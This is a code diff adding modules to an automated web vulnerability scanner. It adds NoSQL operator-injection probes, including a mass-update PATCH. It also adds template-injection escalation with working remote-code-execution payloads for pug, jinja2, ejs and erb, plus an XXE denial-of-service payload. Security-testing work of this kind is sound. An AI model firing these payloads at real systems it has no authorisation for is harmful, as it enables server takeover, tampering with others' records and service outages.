@@ -623,6 +623,389 @@ async function authLogicScan(input: ScanInput): Promise<void> {
   }
 }
 
+// ── NoSQL Injection Scanner ───────────────────────────────────────────────────
+// Probes JSON-accepting endpoints for MongoDB-style operator injection ($ne,
+// $gt, $where, $regex) and update-operator abuse ($set on PATCH). Uses both
+// size-differential and time-based detection.
+
+const NOSQL_REVIEW_PATHS = [
+  "/rest/products/reviews",
+  "/api/reviews",
+  "/api/products/reviews",
+  "/rest/reviews",
+]
+
+async function nosqlScan(input: ScanInput): Promise<void> {
+  const token = input.token ?? getToken(input.sessionID)
+  const authHeaders: Record<string, string> = {
+    "Content-Type": "application/json",
+    ...(token ? { Authorization: `Bearer ${token}` } : {}),
+  }
+
+  // Collect targets: openApiOps with JSON body params + hardcoded review/order paths
+  const opTargets = input.openApiOps
+    .filter((op) => ["POST", "PUT", "PATCH"].includes(op.method))
+    .filter((op) => op.params.some((p) => p.in === "body"))
+
+  const reviewLike = input.endpoints.filter(
+    (e) => /review|order/i.test(e.path) && ["POST", "PUT", "PATCH"].includes(e.method),
+  )
+
+  // Also add hardcoded review paths (may not be in discovered endpoints)
+  const hardcodedTargets = NOSQL_REVIEW_PATHS.map((p) => ({ method: "POST", path: p }))
+
+  // --- 1. $ne / $gt size-differential on GET-returning endpoints ---
+  for (const ep of [...hardcodedTargets, ...reviewLike]) {
+    const baseRes = await safeFetch(input.target + ep.path, "GET", { headers: authHeaders })
+    if (!baseRes || baseRes.status >= 400) continue
+    const baseLen = baseRes.body.length
+
+    for (const op of ["$ne", "$gt"] as const) {
+      const qUrl = `${input.target}${ep.path}?id[${op}]=`
+      const qRes = await safeFetch(qUrl, "GET", { headers: authHeaders })
+      if (qRes && qRes.status === 200 && qRes.body.length > baseLen * 1.5 && qRes.body.length > baseLen + 200) {
+        log.info("nosql-scan: CONFIRMED (size-differential)", { path: ep.path, operator: op })
+        Vulnerability.add({
+          sessionID: input.sessionID,
+          data: {
+            severity: "high",
+            title: `NoSQL Injection (${op} operator) on ${ep.path}`,
+            description: `MongoDB ${op} operator injection confirmed on ${ep.path}. Query param id[${op}]= returned ${qRes.body.length} bytes vs baseline ${baseLen} bytes — filter bypass leaks extra records.`,
+            cwe_id: "CWE-943",
+            endpoint: `GET ${ep.path}`,
+            attack_vector: "query_param",
+            steps_to_reproduce: [
+              `1. GET ${input.target}${ep.path} → ${baseLen} bytes (baseline)`,
+              `2. GET ${qUrl} → ${qRes.body.length} bytes (filter bypassed)`,
+            ].join("\n"),
+            business_impact: "Data exfiltration — attacker can bypass filters to read all records.",
+            recommendation: "Sanitize MongoDB query inputs. Reject object/operator values in user input.",
+            poc: `GET ${ep.path}?id[${op}]= → ${qRes.body.length} bytes vs baseline ${baseLen}`,
+          },
+        })
+        return
+      }
+    }
+  }
+
+  // --- 2. $where time-based DoS on review/order endpoints ---
+  for (const ep of [...hardcodedTargets, ...reviewLike]) {
+    const baseRes = await safeFetch(input.target + ep.path, "GET", { headers: authHeaders })
+    const baseElapsed = baseRes?.elapsed ?? 0
+
+    const sleepUrl = `${input.target}${ep.path}?id[$where]=sleep(2000)`
+    const sleepRes = await safeFetch(sleepUrl, "GET", { headers: authHeaders })
+    if (sleepRes && sleepRes.elapsed > baseElapsed + 1500 && sleepRes.elapsed > 2000) {
+      log.info("nosql-scan: CONFIRMED ($where sleep)", { path: ep.path, baseElapsed, sleepElapsed: sleepRes.elapsed })
+      Vulnerability.add({
+        sessionID: input.sessionID,
+        data: {
+          severity: "high",
+          title: `NoSQL Injection ($where DoS) on ${ep.path}`,
+          description: `MongoDB $where operator injection enables server-side JavaScript execution. sleep(2000) increased response time from ${baseElapsed}ms to ${sleepRes.elapsed}ms.`,
+          cwe_id: "CWE-943",
+          endpoint: `GET ${ep.path}`,
+          attack_vector: "query_param",
+          steps_to_reproduce: [
+            `1. GET ${input.target}${ep.path} → ~${baseElapsed}ms (baseline)`,
+            `2. GET ${sleepUrl} → ~${sleepRes.elapsed}ms (2s sleep executed)`,
+          ].join("\n"),
+          business_impact: "Denial of Service and potential data exfiltration via server-side JS execution.",
+          recommendation: "Disable $where operator. Use parameterized queries.",
+          poc: `GET ${ep.path}?id[$where]=sleep(2000) → ${sleepRes.elapsed}ms vs baseline ${baseElapsed}ms`,
+        },
+      })
+      return
+    }
+  }
+
+  // --- 3. $set operator injection on PATCH ---
+  for (const ep of [...hardcodedTargets.map((h) => ({ ...h, method: "PATCH" })), ...reviewLike.filter((e) => e.method === "PATCH")]) {
+    // First, POST a review we own so we can PATCH it
+    const postRes = await safeFetch(input.target + ep.path, "POST", {
+      headers: authHeaders,
+      body: JSON.stringify({ message: "nosql_scan_test", author: "scanner" }),
+    })
+    if (!postRes || postRes.status >= 400) continue
+
+    // Try PATCH with $set to change author
+    const patchRes = await safeFetch(input.target + ep.path, "PATCH", {
+      headers: authHeaders,
+      body: JSON.stringify({ id: { $ne: "" }, author: "nosql_scan_spoofed" }),
+    })
+    if (!patchRes || patchRes.status >= 400) continue
+
+    // Verify by GET — if any review now has author "nosql_scan_spoofed", $set worked
+    const verifyRes = await safeFetch(input.target + ep.path, "GET", { headers: authHeaders })
+    if (verifyRes && verifyRes.body.includes("nosql_scan_spoofed")) {
+      log.info("nosql-scan: CONFIRMED ($set/PATCH)", { path: ep.path })
+      Vulnerability.add({
+        sessionID: input.sessionID,
+        data: {
+          severity: "high",
+          title: `NoSQL Update Operator Injection on PATCH ${ep.path}`,
+          description: `MongoDB update operator injection on PATCH ${ep.path}. Using {"id":{"$ne":""},"author":"spoofed"} modifies multiple reviews, proving mass-update capability.`,
+          cwe_id: "CWE-943",
+          endpoint: `PATCH ${ep.path}`,
+          attack_vector: "request_body",
+          steps_to_reproduce: [
+            `1. PATCH ${input.target}${ep.path} with {"id":{"$ne":""},"author":"nosql_scan_spoofed"}`,
+            `2. GET ${input.target}${ep.path} → response contains "nosql_scan_spoofed"`,
+          ].join("\n"),
+          business_impact: "Mass data manipulation — attacker can modify all records matching a NoSQL filter.",
+          recommendation: "Validate PATCH body fields. Reject MongoDB operators in user input.",
+          poc: `PATCH ${ep.path} {"id":{"$ne":""},"author":"spoofed"} → review author changed`,
+        },
+      })
+      return
+    }
+  }
+
+  // --- 4. JSON body $ne injection on OpenAPI-discovered POST/PUT endpoints ---
+  for (const op of opTargets) {
+    const stringParams = op.params.filter((p) => p.in === "body")
+    if (stringParams.length === 0) continue
+
+    const baseBody: Record<string, unknown> = {}
+    for (const p of stringParams) {
+      if (p.type === "number" || p.type === "integer") baseBody[p.name] = 1
+      else baseBody[p.name] = "test"
+    }
+
+    const baseRes = await safeFetch(input.target + op.path, op.method, {
+      headers: authHeaders,
+      body: JSON.stringify(baseBody),
+    })
+    if (!baseRes) continue
+    const baseLen = baseRes.body.length
+
+    for (const param of stringParams.filter((p) => p.type === "string")) {
+      const neBody = { ...baseBody, [param.name]: { $ne: "" } }
+      const neRes = await safeFetch(input.target + op.path, op.method, {
+        headers: authHeaders,
+        body: JSON.stringify(neBody),
+      })
+      if (!neRes || neRes.status >= 500) continue
+
+      if (neRes.body.length > baseLen * 1.5 && neRes.body.length > baseLen + 200) {
+        log.info("nosql-scan: CONFIRMED (body $ne)", { endpoint: `${op.method} ${op.path}`, param: param.name })
+        Vulnerability.add({
+          sessionID: input.sessionID,
+          data: {
+            severity: "high",
+            title: `NoSQL Injection ($ne in body) on ${op.method} ${op.path}`,
+            description: `Passing {"${param.name}":{"$ne":""}} to ${op.method} ${op.path} returned ${neRes.body.length} bytes vs baseline ${baseLen} bytes — MongoDB operator accepted in JSON body.`,
+            cwe_id: "CWE-943",
+            endpoint: `${op.method} ${op.path}`,
+            attack_vector: "request_body",
+            steps_to_reproduce: [
+              `1. ${op.method} ${input.target}${op.path} with {"${param.name}":"test"} → ${baseLen} bytes`,
+              `2. ${op.method} with {"${param.name}":{"$ne":""}} → ${neRes.body.length} bytes`,
+            ].join("\n"),
+            business_impact: "Data exfiltration via NoSQL filter bypass.",
+            recommendation: "Reject object values in string fields. Use strict schema validation.",
+            poc: `${op.method} ${op.path} {"${param.name}":{"$ne":""}} → ${neRes.body.length} bytes vs ${baseLen}`,
+          },
+        })
+        return
+      }
+    }
+  }
+}
+
+// ── SSTI Escalation Scanner ──────────────────────────────────────────────────
+// Runs AFTER sstiScan. If SSTI arithmetic was already confirmed, attempts RCE
+// payloads to escalate from PoC to demonstrated code execution.
+
+const SSTI_RCE_PAYLOADS: Array<{ engine: string; payload: string; marker: RegExp }> = [
+  {
+    engine: "pug",
+    payload: `#{global.process.mainModule.require('child_process').execSync('id').toString()}`,
+    marker: /uid=\d+/,
+  },
+  {
+    engine: "pug",
+    payload: `#{global.process.mainModule.require('child_process').execSync('cat /etc/hostname').toString()}`,
+    marker: /^[a-f0-9]{8,}|[a-zA-Z0-9._-]+$/m,
+  },
+  {
+    engine: "jinja2",
+    payload: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`,
+    marker: /uid=\d+/,
+  },
+  {
+    engine: "ejs",
+    payload: `<%= global.process.mainModule.require('child_process').execSync('id').toString() %>`,
+    marker: /uid=\d+/,
+  },
+  {
+    engine: "erb",
+    payload: `<%= \`id\` %>`,
+    marker: /uid=\d+/,
+  },
+]
+
+async function sstiEscalationScan(input: ScanInput): Promise<void> {
+  // Only run if sstiScan already found an SSTI vuln
+  const existing = Vulnerability.get(input.sessionID)
+  const sstiVuln = existing.find((v) => /Server-Side Template Injection/i.test(v.title ?? ""))
+  if (!sstiVuln) {
+    log.info("ssti-escalation: no prior SSTI finding, skipping")
+    return
+  }
+
+  const token = input.token ?? getToken(input.sessionID)
+  if (!token) return
+  const cookieHeaders: Record<string, string> = { Cookie: `token=${token}` }
+
+  for (const rce of SSTI_RCE_PAYLOADS) {
+    const updateRes = await safeFetch(input.target + "/profile", "POST", {
+      headers: { ...cookieHeaders, "Content-Type": "application/x-www-form-urlencoded" },
+      body: `username=${encodeURIComponent(rce.payload)}`,
+    })
+    if (!updateRes || updateRes.status >= 400) continue
+
+    for (const renderPath of RENDER_PATHS) {
+      const renderRes = await safeFetch(input.target + renderPath, "GET", { headers: cookieHeaders })
+      if (!renderRes || renderRes.status >= 400) continue
+
+      if (rce.marker.test(renderRes.body)) {
+        log.info("ssti-escalation: RCE CONFIRMED", { engine: rce.engine, path: renderPath })
+
+        const matched = renderRes.body.match(rce.marker)?.[0] ?? "(matched)"
+        Vulnerability.add({
+          sessionID: input.sessionID,
+          data: {
+            severity: "critical",
+            title: `SSTI Remote Code Execution (${rce.engine})`,
+            description: `SSTI escalated to RCE via ${rce.engine} template engine on /profile. Payload: ${rce.payload.slice(0, 80)}... Server executed OS command and returned "${matched}".`,
+            cwe_id: "CWE-94",
+            endpoint: `GET ${renderPath}`,
+            attack_vector: "request_body",
+            steps_to_reproduce: [
+              `1. POST ${input.target}/profile with username = "${rce.payload.slice(0, 60)}..."`,
+              `2. GET ${input.target}${renderPath}`,
+              `3. Response contains "${matched}" — OS command executed`,
+            ].join("\n"),
+            business_impact:
+              "Full Remote Code Execution — attacker can run arbitrary OS commands on the server.",
+            recommendation: "Sandbox template rendering. Never pass user input to template engines unsanitized.",
+            poc: `POST /profile username="${rce.payload.slice(0, 60)}..." → GET ${renderPath} → "${matched}"`,
+          },
+        })
+
+        await safeFetch(input.target + "/profile", "POST", {
+          headers: { ...cookieHeaders, "Content-Type": "application/x-www-form-urlencoded" },
+          body: `username=${encodeURIComponent("scanner_restored")}`,
+        })
+        return
+      }
+    }
+
+    // Restore after each attempt
+    await safeFetch(input.target + "/profile", "POST", {
+      headers: { ...cookieHeaders, "Content-Type": "application/x-www-form-urlencoded" },
+      body: `username=${encodeURIComponent("scanner_test")}`,
+    })
+  }
+}
+
+// ── XXE DoS Escalation Scanner ───────────────────────────────────────────────
+// Runs AFTER other scanners. If XXE was already confirmed, attempts DoS via
+// file:///dev/random entity expansion (causes server to block reading).
+
+async function xxeDosScan(input: ScanInput): Promise<void> {
+  const existing = Vulnerability.get(input.sessionID)
+  const xxeVuln = existing.find((v) => /XXE|XML External Entity/i.test(v.title ?? ""))
+  if (!xxeVuln) {
+    log.info("xxe-dos: no prior XXE finding, skipping")
+    return
+  }
+
+  const token = input.token ?? getToken(input.sessionID)
+  const authHeaders: Record<string, string> = {
+    "Content-Type": "application/xml",
+    ...(token ? { Authorization: `Bearer ${token}` } : {}),
+  }
+
+  const uploadPaths = ["/file-upload", "/api/Complaints", "/profile/image/upload"]
+
+  // Baseline timing
+  const baseRes = await safeFetch(input.target + "/", "GET")
+  const baseElapsed = baseRes?.elapsed ?? 200
+
+  const dosPayload = [
+    `<?xml version="1.0" encoding="UTF-8"?>`,
+    `<!DOCTYPE foo [`,
+    `  <!ENTITY xxe SYSTEM "file:///dev/random">`,
+    `]>`,
+    `<root>&xxe;</root>`,
+  ].join("\n")
+
+  for (const uploadPath of uploadPaths) {
+    const dosRes = await safeFetch(input.target + uploadPath, "POST", {
+      headers: authHeaders,
+      body: dosPayload,
+    })
+
+    if (dosRes && dosRes.elapsed > baseElapsed + 4000 && dosRes.elapsed > 5000) {
+      log.info("xxe-dos: CONFIRMED", { path: uploadPath, baseElapsed, dosElapsed: dosRes.elapsed })
+      Vulnerability.add({
+        sessionID: input.sessionID,
+        data: {
+          severity: "high",
+          title: `XXE Denial of Service via file:///dev/random on ${uploadPath}`,
+          description: `XXE DoS confirmed on ${uploadPath}. Entity referencing file:///dev/random caused server to block for ${dosRes.elapsed}ms (baseline ${baseElapsed}ms). Server reads from /dev/random which blocks when entropy pool is exhausted.`,
+          cwe_id: "CWE-611",
+          endpoint: `POST ${uploadPath}`,
+          attack_vector: "request_body",
+          steps_to_reproduce: [
+            `1. GET ${input.target}/ → ~${baseElapsed}ms (baseline)`,
+            `2. POST ${input.target}${uploadPath} with XML containing <!ENTITY xxe SYSTEM "file:///dev/random">`,
+            `3. Response time: ~${dosRes.elapsed}ms (server blocked reading /dev/random)`,
+          ].join("\n"),
+          business_impact: "Denial of Service — attacker can hang the server by forcing it to read /dev/random.",
+          recommendation: "Disable external entity processing in XML parsers.",
+          poc: `POST ${uploadPath} [XXE:file:///dev/random] → ${dosRes.elapsed}ms vs baseline ${baseElapsed}ms`,
+        },
+      })
+      return
+    }
+
+    // Also try multipart upload with the XML as a file
+    const formData = new FormData()
+    formData.append("file", new Blob([dosPayload], { type: "application/xml" }), "xxe.xml")
+    const formHeaders: Record<string, string> = token ? { Authorization: `Bearer ${token}` } : {}
+    const formRes = await safeFetch(input.target + uploadPath, "POST", {
+      headers: formHeaders,
+      body: formData,
+    })
+
+    if (formRes && formRes.elapsed > baseElapsed + 4000 && formRes.elapsed > 5000) {
+      log.info("xxe-dos: CONFIRMED (multipart)", { path: uploadPath, baseElapsed, dosElapsed: formRes.elapsed })
+      Vulnerability.add({
+        sessionID: input.sessionID,
+        data: {
+          severity: "high",
+          title: `XXE Denial of Service via file upload on ${uploadPath}`,
+          description: `XXE DoS confirmed via multipart file upload on ${uploadPath}. XML file with entity referencing file:///dev/random caused ${formRes.elapsed}ms response (baseline ${baseElapsed}ms).`,
+          cwe_id: "CWE-611",
+          endpoint: `POST ${uploadPath}`,
+          attack_vector: "request_body",
+          steps_to_reproduce: [
+            `1. Upload XML file to ${input.target}${uploadPath} with <!ENTITY xxe SYSTEM "file:///dev/random">`,
+            `2. Response time: ~${formRes.elapsed}ms (server blocked)`,
+          ].join("\n"),
+          business_impact: "Denial of Service via XML External Entity processing.",
+          recommendation: "Disable external entity processing. Validate uploaded file types.",
+          poc: `POST ${uploadPath} [multipart XXE:file:///dev/random] → ${formRes.elapsed}ms`,
+        },
+      })
+      return
+    }
+  }
+}
+
 // ── Main entry point ──────────────────────────────────────────────────────────
 
 export namespace AutoScanner {
@@ -636,6 +1019,7 @@ export namespace AutoScanner {
       filenames: input.filenames.length,
     })
 
+    // Phase 1: parallel primary scanners
     const results = await Promise.allSettled([
       sstiScan({ ...input, sessionID: rootID }).catch((e) =>
         log.warn("ssti-scan error", { error: String(e) }),
@@ -652,9 +1036,24 @@ export namespace AutoScanner {
       authLogicScan({ ...input, sessionID: rootID }).catch((e) =>
         log.warn("auth-logic-scan error", { error: String(e) }),
       ),
+      nosqlScan({ ...input, sessionID: rootID }).catch((e) =>
+        log.warn("nosql-scan error", { error: String(e) }),
+      ),
     ])
 
-    const failed = results.filter((r) => r.status === "rejected").length
+    // Phase 2: escalation scanners that depend on phase-1 findings
+    const escalationResults = await Promise.allSettled([
+      sstiEscalationScan({ ...input, sessionID: rootID }).catch((e) =>
+        log.warn("ssti-escalation error", { error: String(e) }),
+      ),
+      xxeDosScan({ ...input, sessionID: rootID }).catch((e) =>
+        log.warn("xxe-dos error", { error: String(e) }),
+      ),
+    ])
+
+    const failed =
+      results.filter((r) => r.status === "rejected").length +
+      escalationResults.filter((r) => r.status === "rejected").length
     log.info("auto-scanner complete", { sessionID: rootID, failed })
   }
 }
